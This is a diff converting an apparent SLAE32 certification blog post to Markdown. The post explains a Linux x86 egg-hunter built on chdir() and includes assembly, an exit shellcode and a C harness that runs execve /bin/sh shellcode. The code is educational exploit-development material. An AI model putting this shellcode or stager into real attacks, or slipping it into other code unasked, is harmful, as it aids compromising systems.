@@ -1,22 +1,66 @@
 Title: SLAE32 - Assignment 3
 Date: 2022-06-04T09:14:33.000Z
 
-<h2 id="disclaimer">Disclaimer</h2><p>This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert Certification:</p><p><a href="https://www.pentesteracademy.com/course?id=3">https://www.pentesteracademy.com/course?id=3</a></p><p>Student ID: PA-30398</p><h2 id="source-code">Source Code</h2><!--kg-card-begin: markdown--><p>The source code for this assignment can be found <a href="https://github.com/rbctee/SlaeExam/tree/main/slae32/assignment/3">here</a>.</p>
-<p>Follows the list of files:</p>
-<ul>
-<li><a href="https://github.com/rbctee/SlaeExam/blob/main/slae32/assignment/3/egg_hunter.nasm">egg_hunter.nasm</a>, the Assembly code of the egg-hunter</li>
-<li><a href="https://github.com/rbctee/SlaeExam/blob/main/slae32/assignment/3/test_egg_hunter.c">test_egg_hunter.c</a>, a C program written for testing the egg-hunter with the <code>execve</code> shellcode</li>
-</ul>
-<!--kg-card-end: markdown--><h2 id="theory">Theory</h2><!--kg-card-begin: markdown--><p>Now comes the question: what is an <em>Egg Hunter</em>?</p>
-<p>According to a <a href="https://www.exploit-db.com/docs/english/18482-egg-hunter---a-twist-in-buffer-overflow.pdf">paper</a> from <code>Exploit-DB</code>:</p>
-<blockquote>
-<p>When the &quot;Egg hunter&quot; shellcode is executed, it searches for the unique &quot;tag&quot; that was prefixed with the large payload and starts the execution of the payload.<br>
-[...]<br>
-The Egg hunting technique is used when there are not enough available consecutive memory locations to insert the shellcode. Instead, a unique &quot;tag&quot; is prefixed with shellcode.</p>
-</blockquote>
-<!--kg-card-end: markdown--><h2 id="practice">Practice</h2><h3 id="implementation">Implementation</h3><p>Given I had zero experience with <code>egg hunters</code>, I tried to search for documents detailing how to create this type of shellcode.</p><p>I stumbled on this particular document - <a href="http://www.hick.org/code/skape/papers/egghunt-shellcode.pdf">Safely Searching Process Virtual Address Space</a> - which shows some techniques you can employ for your own implementation.</p><p>Since the <em>SIGSEGV handler technique</em> is considered <em>infeasible</em>, mainly due to its size, I decided to try using the <em>system call technique</em>.</p><p>The system call I chose to use is <a href="https://man7.org/linux/man-pages/man2/chdir.2.html">chdir()</a>. Follows its prototype:</p><pre><code class="language-cpp">#include &lt;unistd.h&gt;
 
-int chdir(const char *path);</code></pre><p>All it does is try to change the <em>Current Working Directory</em> (<code>CWD</code>) to the path pointed to the argument <code>path</code> (which is a pointer).</p><p>Since it accepts a pointer, we can use it to test memory addresses. Given the function already implements a <em>SIGSEGV handler</em>, it doesn't throw a SIGSEGV error, crashing the program.</p><p>Instead, it returns the error <code>EFAULT</code> (<code>0xfffffff2</code>), indicating that a bad address was passed to the function.</p><p>Follows my implementation in Assembly language:</p><pre><code class="language-nasm">; Author: Robert C. Raducioiu (rbct)
+## Disclaimer
+
+This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert Certification:
+
+https://www.pentesteracademy.com/course?id=3
+
+Student ID: PA-30398
+
+## Source Code
+
+The source code for this assignment can be found [here](https://github.com/rbctee/SlaeExam/tree/main/slae32/assignment/3).
+
+Follows the list of files:
+
+- [egg_hunter.nasm](https://github.com/rbctee/SlaeExam/blob/main/slae32/assignment/3/egg_hunter.nasm), the Assembly code of the egg-hunter
+
+- [test_egg_hunter.c](https://github.com/rbctee/SlaeExam/blob/main/slae32/assignment/3/test_egg_hunter.c), a C program written for testing the egg-hunter with the `execve` shellcode
+
+## Theory
+
+Now comes the question: what is an `Egg Hunter`?
+
+According to a [paper](https://www.exploit-db.com/docs/english/18482-egg-hunter---a-twist-in-buffer-overflow.pdf) from `Exploit-DB`:
+
+<blockquote>
+When the &quot;Egg hunter&quot; shellcode is executed, it searches for the unique &quot;tag&quot; that was prefixed with the large payload and starts the execution of the payload.<br>
+[...]<br>
+The Egg hunting technique is used when there are not enough available consecutive memory locations to insert the shellcode. Instead, a unique &quot;tag&quot; is prefixed with shellcode.
+
+</blockquote>
+
+## Practice
+
+### Implementation
+
+Given I had zero experience with `egg hunters`, I tried to search for documents detailing how to create this type of shellcode.
+
+I stumbled on this particular document - [Safely Searching Process Virtual Address Space](http://www.hick.org/code/skape/papers/egghunt-shellcode.pdf) - which shows some techniques you can employ for your own implementation.
+
+Since the `SIGSEGV handler technique` is considered `infeasible`, mainly due to its size, I decided to try using the `system call technique`.
+
+The system call I chose to use is [chdir()](https://man7.org/linux/man-pages/man2/chdir.2.html). Follows its prototype:
+
+```cpp
+#include <unistd.h>
+
+int chdir(const char *path);
+```
+
+All it does is try to change the `Current Working Directory` (`CWD`) to the path pointed to the argument `path` (which is a pointer).
+
+Since it accepts a pointer, we can use it to test memory addresses. Given the function already implements a `SIGSEGV handler`, it doesn't throw a SIGSEGV error, crashing the program.
+
+Instead, it returns the error `EFAULT` (`0xfffffff2`), indicating that a bad address was passed to the function.
+
+Follows my implementation in Assembly language:
+
+```nasm
+; Author: Robert C. Raducioiu (rbct)
 
 global _start
 
@@ -67,17 +111,39 @@ CheckBytes:
     ; if the two DWORDs are equal, then increment the address by 4, and
     ;   execute the shellcode
     add ebx, 4
-    call ebx</code></pre><h2 id="testing">Testing</h2><p>I've tested this egg-hunter above with the <code>exit</code> shellcode. To do this, I've appended the following Assembly code at the end of the previous file:</p><pre><code class="language-nasm">section .data
+    call ebx
+```
 
-    shellcode: db 0x74, 0x63, 0x62, 0x72, 0x31, 0xc0, 0x40, 0xcd, 0x80</code></pre><p>After running it, I've confirmed it works correctly:</p><pre><code class="language-bash"># assembling
+## Testing
+
+I've tested this egg-hunter above with the `exit` shellcode. To do this, I've appended the following Assembly code at the end of the previous file:
+
+```nasm
+section .data
+
+    shellcode: db 0x74, 0x63, 0x62, 0x72, 0x31, 0xc0, 0x40, 0xcd, 0x80
+```
+
+After running it, I've confirmed it works correctly:
+
+```bash
+# assembling
 nasm -f elf32 egg_hunter.nasm
 
 # linking
 #   also set the stack as executable (for the exit shellcode)
 ld -N -o egg_hunter egg_hunter.o
 
-./egg_hunter</code></pre><p>Instead of throwing a <code>SIGSEGV</code> error, it ran the exit shellcode successfully.</p><p>Next, I decided to try it with the <code>execve-stack</code> shellcode:</p><pre><code class="language-cpp">#include &lt;stdio.h&gt;
-#include &lt;string.h&gt;
+./egg_hunter
+```
+
+Instead of throwing a `SIGSEGV` error, it ran the exit shellcode successfully.
+
+Next, I decided to try it with the `execve-stack` shellcode:
+
+```cpp
+#include <stdio.h>
+#include <string.h>
 
 // tag "rbct" prepended to the shellcode
 unsigned char shellcode[] = "\x74\x63\x62\x72\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\xb0\x0b\x89\xe3\x31\xc9\x31\xd2\xcd\x80";
@@ -92,4 +158,9 @@ main() {
     // run the egg-hunter shellcode
     int (*ret)() = (int(*)())egghunter;
     ret();
-}</code></pre><p>I saved the <code>execve</code> shellcode inside an array named <code>shellcode</code>, while storing the egg-hunter shellcode inside the array <code>egghunter</code>.</p><p>Inside the <code>main</code> function, the programs prints the length of the two shellcodes, and finally executes the egg-hunter shellcode. It does so by getting the pointer of the latter, and turning it into a function.</p><p>Follows a screenshot demonstrating the successful execution of the program:</p><figure class="kg-card kg-image-card kg-card-hascaption"><img src="__GHOST_URL__/content/images/2022/06/image-3.png" class="kg-image" alt="Egg-hunter found and executed the execve shellcode" loading="lazy" width="1251" height="203" srcset="__GHOST_URL__/content/images/size/w600/2022/06/image-3.png 600w, __GHOST_URL__/content/images/size/w1000/2022/06/image-3.png 1000w, __GHOST_URL__/content/images/2022/06/image-3.png 1251w" sizes="(min-width: 720px) 720px"><figcaption>Egg-hunter found and executed the <code>execve</code> shellcode</figcaption></figure>
+}
+```
+
+I saved the `execve` shellcode inside an array named `shellcode`, while storing the egg-hunter shellcode inside the array `egghunter`.
+
+Inside the `main` function, the programs prints the length of the two shellcodes, and finally executes the egg-hunter shellcode. It does so by getting the pointer of the latter, and turning it into a function.
